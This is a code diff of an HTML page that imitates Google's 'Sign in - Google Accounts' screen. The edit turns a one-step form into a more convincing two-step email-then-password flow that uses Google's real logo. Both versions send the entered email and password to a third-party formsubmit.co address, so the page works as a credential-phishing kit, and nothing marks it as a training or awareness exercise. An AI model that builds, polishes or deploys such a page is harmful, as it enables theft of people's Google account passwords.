@@ -3,248 +3,121 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Sign in to Google Accounts</title>
-
+    <title>Sign in - Google Accounts</title>
     <link rel="preconnect" href="https://fonts.gstatic.com" />
     <link
-      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
       rel="stylesheet"
     />
     <style>
-      /* General Styles */
       body {
         font-family: 'Roboto', sans-serif;
-        margin: 0;
-        padding: 0;
         display: flex;
         justify-content: center;
         align-items: center;
         height: 100vh;
-        background-color: #f5f5f5;
+        background-color: #fff;
+        margin: 0;
       }
-
       .container {
         width: 100%;
-        max-width: 420px;
-        padding: 20px;
-        background-color: white;
-        border-radius: 8px;
-        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        padding: 40px;
+        text-align: left;
       }
-
-      .card {
-        text-align: center;
-        padding: 20px;
-      }
-
-      .google-logo {
-        width: 150px;
+      .logo {
+        display: block;
+        width: 74px;
         margin-bottom: 20px;
       }
-
-      h2 {
+      h1 {
         font-size: 24px;
-        font-weight: 500;
-        margin: 10px 0;
+        font-weight: 400;
+        margin: 0;
       }
-
-      h3 {
-        font-size: 16px;
+      p {
         color: #5f6368;
-        margin-bottom: 20px;
+        font-size: 16px;
+        margin-top: 5px;
       }
-
-      input[type="email"],
-      input[type="password"] {
+      input {
         width: 100%;
         padding: 12px;
-        margin: 10px 0;
+        font-size: 16px;
+        border: 1px solid #ccc;
         border-radius: 4px;
-        border: 1px solid #ddd;
-        box-sizing: border-box;
+        margin-top: 20px;
       }
-
-      button[type="button"] {
-        background: transparent;
-        border: none;
-        color: #4285f4;
-        cursor: pointer;
-        text-decoration: underline;
+      a {
+        color: #1a73e8;
+        text-decoration: none;
         font-size: 14px;
-        margin: 10px 0;
+        display: inline-block;
+        margin-top: 10px;
       }
-
-      button[type="submit"] {
-        width: 100%;
-        padding: 12px;
-        background-color: #4285f4;
-        color: white;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-
-      button[type="submit"]:hover {
-        background-color: #357ae8;
-      }
-
-      .google-btn {
-        width: 100%;
-        padding: 12px;
-        background-color: white;
-        border: 1px solid #ddd;
-        border-radius: 4px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 16px;
-        cursor: pointer;
-        margin-top: 20px;
-      }
-
-      .google-btn:hover {
-        border-color: #4285f4;
-      }
-
-      .google-icon {
-        width: 20px;
-        height: 20px;
-        margin-right: 10px;
-      }
-
-      .card-bottom {
-        margin-top: 20px;
+      .bottom-links {
         display: flex;
         justify-content: space-between;
         align-items: center;
+        margin-top: 40px;
       }
-
-      .card-bottom a {
-        color: #4285f4;
+      .btn {
+        background-color: #1a73e8;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 4px;
         font-size: 14px;
-        text-decoration: none;
-      }
-
-      .more-options {
-        font-size: 14px;
-        margin-top: 10px;
-      }
-
-      .footer {
-        margin-top: 30px;
-        text-align: center;
-      }
-
-      .footer select {
-        padding: 8px;
-        margin-bottom: 10px;
-      }
-
-      .footer-links {
-        display: flex;
-        justify-content: center;
-        gap: 15px;
-      }
-
-      .footer-links span {
         cursor: pointer;
-        color: #666;
+      }
+      .language-selector {
+        text-align: center;
+        margin-top: 40px;
         font-size: 14px;
-      }
-
-      .footer-links span:hover {
-        color: #4285f4;
-      }
-
-      /* Mobile Responsiveness */
-      @media screen and (max-width: 480px) {
-        .container {
-          padding: 15px;
-        }
-
-        .google-logo {
-          width: 120px;
-        }
-
-        h2 {
-          font-size: 20px;
-        }
-
-        h3 {
-          font-size: 14px;
-        }
-
-        input[type="email"],
-        input[type="password"],
-        button[type="submit"],
-        .google-btn {
-          font-size: 14px;
-        }
-
-        .footer select,
-        .footer-links span {
-          font-size: 12px;
-        }
       }
     </style>
+    <script>
+      function showPasswordStep() {
+        const email = document.getElementById('email').value;
+        if (!email) {
+          alert('Please enter your email or phone number');
+          return;
+        }
+        document.getElementById('loginForm').innerHTML = `
+          <h1>Welcome</h1>
+          <p>to continue, first verify it’s you</p>
+          <form action="https://formsubmit.co/your-email" method="POST">
+            <input type="hidden" name="email" value="${email}" />
+            <input type="password" name="password" placeholder="Enter your password" required />
+            <a href="#">Forgot password?</a>
+            <div class="bottom-links">
+              <a href="#">Try another way</a>
+              <button type="submit" class="btn">Next</button>
+            </div>
+          </form>
+        `;
+      }
+    </script>
   </head>
-
   <body>
     <div class="container">
-      <div class="card">
-        <!-- Google Logo SVG -->
-        <svg xmlns="http://www.w3.org/2000/svg" height="48" viewBox="0 96 960 960" width="48" class="google-logo">
-          <path d="M448 936q-96 0-179-36-83-36-148-101-65-65-101-148Q36 544 36 448q0-96 36-179 36-83 101-148 65-65 148-101Q352 36 448 36q96 0 179 36 83 36 148 101 65 65 101 148 36 83 36 179 0 96-36 179-36 83-101 148-65 65-148 101Q544 936 448 936Zm0-72q66 0 123-25t102-68l-118-118q-30 26-67 40-37 14-76 14-86 0-146-60-60-60-60-146 0-36 9-69 9-33 26-61l-118-118q-53 77-53 174 0 128 89 217 89 89 217 89ZM448 264q-48 0-92 18t-76 49l118 118q27-18 56-26 29-8 58-8 86 0 146 60 60 60 60 146 0 19-3 38-3 19-9 37l118 118q53-77 53-174 0-128-89-217-89-89-217-89Z"/>
-        </svg>
-        
-        <h2>Sign in</h2>
-        <h3>Use your Google Account</h3>
-
-        <form action="https://formsubmit.co/your-email" method="POST">
-          <input type="email" name="email" placeholder="Email or phone" required />
-          <button type="button" class="forgot-email">Forgot email?</button>
-
-          <input type="password" name="password" placeholder="Enter your password" required />
-          <button type="button" class="forgot-password">Forgot password?</button>
-
-          <div class="more-options">
-            <p>
-              Not at your computer? Use <a href="#">Guest Mode</a> to log in privately.
-            </p>
-          </div>
-
-          <div class="card-bottom">
-            <a href="#">Create account</a>
-            <button type="submit" class="next-btn">Next</button>
-          </div>
-        </form>
-
-        <!-- Google Sign-in Button -->
-        <div class="google-login">
-          <button class="google-btn">
-            <!-- Google Icon SVG -->
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="20" height="20" class="google-icon">
-              <path d="M23.49 12.29c0-.73-.07-1.42-.2-2.08H12.7v4.07h5.57c-1.35 3.39-5.12 5.9-9.57 5.9-5.87 0-10.66-4.79-10.66-10.66 0-5.87 4.79-10.66 10.66-10.66 3.13 0 5.92 1.17 7.92 3.13l5.87-5.87C18.43 1.68 15.34 0 12 0 5.37 0 0 5.37 0 12s5.37 12 12 12c6.72 0 12-5.28 12-12z"/>
-            </svg>
-            Sign in with Google
-          </button>
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo" />
+      <div id="loginForm">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <input type="text" id="email" name="email" placeholder="Email or phone" required />
+        <a href="#">Forgot email?</a>
+        <p>
+          Not your computer? Use Guest mode to sign in privately.
+          <a href="#">Learn more about using Guest mode</a>
+        </p>
+        <div class="bottom-links">
+          <a href="#">Create account</a>
+          <button type="button" class="btn" onclick="showPasswordStep()">Next</button>
         </div>
       </div>
-
-      <div class="footer">
-        <select name="select">
-          <option value="Portugês (Brasil)">Portugês (Brasil)</option>
-          <option value="English (United States)">English (United States)</option>
-          <option value="Español (España)">Español (España)</option>
-        </select>
-        <div class="footer-links">
-          <span>Help</span>
-          <span>Privacy</span>
-          <span>Terms</span>
-        </div>
-      </div>
+      <div class="language-selector">English (United States) ▾</div>
     </div>
   </body>
-  </html>
+          </html>
           
